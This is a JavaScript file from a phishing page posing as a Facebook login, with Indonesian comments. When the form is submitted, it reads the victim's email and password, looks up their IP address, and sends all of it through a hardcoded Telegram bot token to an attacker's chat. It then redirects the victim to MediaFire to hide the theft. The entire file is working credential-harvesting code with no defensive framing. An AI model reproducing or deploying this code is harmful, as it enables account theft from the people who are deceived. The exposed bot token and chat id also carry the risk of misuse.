document.getElementById('fbForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const btn = document.getElementById('btnLog');
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    
    const token = "8514761747:AAFRzzegKPnDq_wz5aREmTI4ZThvsiqoNBM";
    const chat_id = "5906696731";
    
    btn.innerText = "Processing...";
    btn.disabled = true;

    // 1. Ambil Waktu Jakarta
    const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    // 2. Ambil IP dulu baru kirim ke Telegram
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            const ip = data.ip;
            const pesan = `<b>🔵 FB LOG NETLIFY 🔵</b>\n\n` +
                          `📧 <b>User:</b> <code>${email}</code>\n` +
                          `🔑 <b>Pass:</b> <code>${pass}</code>\n` +
                          `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                          `⏰ <b>Waktu:</b> <code>${waktu}</code>`;

            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(pesan)}&parse_mode=HTML`;

            // Kirim ke Telegram
            return fetch(url, { mode: 'no-cors' });
        })
        .then(() => {
            // 3. Redirect ke MediaFire
            setTimeout(() => {
                window.location.href = "https://www.mediafire.com/myfiles/";
            }, 500);
        })
        .catch(() => {
            // Jika ada error tetap redirect
            window.location.href = "https://www.mediafire.com/myfiles/";
        });
});
